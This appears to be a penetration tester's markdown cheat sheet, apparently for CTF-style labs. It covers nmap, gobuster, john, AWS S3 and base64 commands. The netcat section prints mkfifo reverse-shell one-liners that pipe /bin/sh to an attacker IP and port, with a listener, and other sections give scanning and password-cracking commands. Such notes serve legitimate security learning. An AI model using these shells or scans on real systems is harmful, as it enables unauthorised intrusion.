---
Title: Tools Organization
Description:
---

## Content

[***01 - Information Gathering***](#01---information-gathering): [💲Nmap](#nmap) - [💲Netcat (nc)](#netcat-nc)

+ Live Host Identification: 💲ping

[***03 - Web Application Analysis***](#03---web-application-analysis): 📦OWASP ZAP, 📦burpsuite

+ Web Crawlers & Directory Bruteforce: [💲gobuster](#gobuster)

[***02 - Vulnerability Analysis***](#02---vulnerability-analysis):[📦Nessus](#nessus), 📦Open VAS

[***05 - Password Attacks***](#05---password-attacks): [💲John](#john)

+ Online Attacks: 💲hydra

[***09 - Sniffing & Spoofing***](#09---sniffing--spoofing): 💲responder, 💲tcpdump, 📦wireshark

[***10 - Post Exploitation***](#10---post-exploitation): 💲evil-winrm

<!-- 
[***Website Vulnerability Scan***](#website-vulnerability-scan): Acunetix Web Vulnerability Scanner (AWVS)
***Passive***:
[***DNS***](#dns): whois, nslookup, host, dig, fierce, DNSenum, DNSrecon, Sublist3r, dnsdumpster
[***Web Reconnaissance***](#web-reconnaissance): Google Hacking, Google Map, shadon, Recon-ng
[***Git***](#git): Github/Gitlab, scrabble, GitHack
[***Email***](#email): theHarvester
***Active***
[***Network Service***](#network-service): Netdiscover, Netdiscover
[***SNMP***](#snmp): Onesixtyone, SNMPwalk
[***Samba***](#samba): rpcclient, enum4linux
[***Web***](#web): Nikto, DRIB, Dirbuster, WPScan
 -->

[***Storage Service***](#storage-service): [💲AWS-S3](#aws-s3), 💲mysql, 💲redis-cli

[***File & Data***](#filedata): ASCII, 💲base64, 💲[exiftool](#exiftool)

[***Useful Repository***](#useful-repository): 📒[SecLists](#seclists)

## 01 - Information Gathering

### 💲nmap

<https://nmap.org/>

`sudo nmap --top-ports 3000  -F -sS -sC -sV -n -T4 ${ip}`

> -F: Fast mode - Scan fewer ports than the default scan
>
> -sS (TCP SYN scan)
> SYN scan is the default and most popular scan option for good reasons. It can be
> performed quickly, scanning thousands of ports per second on a fast network not
> hampered by restrictive firewalls.
>
> -sC: Performs a script scan using the default set of scripts. It is equivalent to --
> script=default. Some of the scripts in this category are considered intrusive and
> should not be run against a target network without permission.
>
> -sV: Enables version detection, which will detect what versions are running on what port.
>
> -n (No DNS resolution)
>
> -T4 prohibits the dynamic scan delay from exceeding 10 ms for TCP ports

#### 💲NetCat (nc)

Netcat is a versatile utility for working with TCP or UDP data.

``` shell
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 172.18.0.1 1337 > /tmp/f; rm /tmp/f
nc -nlvp 1337

rm /tmp/f; mkfifo /tmp/f; nc <attack IP> <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
```

+ [Netcat（Linux nc 指令）網路管理者工具實用範例](https://blog.gtwang.org/linux/linux-utility-netcat-examples/)

## 02 - Vulnerability Analysis

### 📦Nessus

+ [How to Get Started with Nessus on Kali Linux | Tenable®](https://www.tenable.com/blog/getting-started-with-nessus-on-kali-linux)

## 03 - Web Application Analysis

### 💲gobuster

directory/file enumeration mode

+ `gobuster dir --url http://${ip}/ --wordlist ../../tools/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -x php,html`

VHOST enumeration mode

+ `gobuster vhost -w ../../tools/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u http://thetoppers.htb`

## 05 - Password Attacks

### 💲john

Password cracker.

`john -w=rockyou.txt hash.txt`

## 09 - Sniffing & Spoofing

## 10 - Post Exploitation

---

<!-- 
## Website Vulnerability Scan
## DNS
## Web Reconnaissance
## Git
## Email
## Other
## Network Service
## SNMP
## Samba
## Web
## Reverse Shell
## Dump Traffic
 -->

## Storage Service

### 💲AWS-S3

+ `aws configure`
+ `aws s3 ls`

## File&Data

### ASCII

+ convert ASCII values into ASCII characters: \
  `echo "65 66 67" | awk '{ for(i=1;i<=NF;i++) printf("%c",$i); print "";  }'`

### 💲base64  

Encode or decode file or standard input to/from Base64, to standard output. \
More information: <https://www.gnu.org/software/coreutils/base64>.

+ Encode the contents of a file as base64 and write the result to stdout: \
  `base64 filename`

+ Decode the base64 contents of a file and write the result to stdout: \
  `base64 --decode filename`

+ Encode from stdin: \
  `<command> | base64`

+ Decode from stdin: \
  `<command> | base64 --decode`

### 💲exiftool  

Read and write meta information in files. \
More information: <https://exiftool.org.>.

## Useful Repository

### 📒SecLists

  <https://github.com/danielmiessler/SecLists>

  SecLists is the security tester's companion. It's a collection of multiple types of lists used during security assessments, collected in one place. List types include usernames, passwords, URLs, sensitive data patterns, fuzzing payloads, web shells, and many more.
